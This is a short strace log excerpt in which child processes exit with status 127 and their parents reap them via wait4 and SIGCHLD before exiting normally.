+254   exit_group(127)                   = ?
+254   +++ exited with 127 +++
+252   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 254
+252   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=254, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+252   wait4(-1, 0x7fff69c0b74c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+252   exit_group(127)                   = ?
+252   +++ exited with 127 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 252
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=252, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+212   exit_group(0)                     = ?
+212   +++ exited with 0 +++
+218   exit_group(0)                     = ?
+218   +++ exited with 0 +++
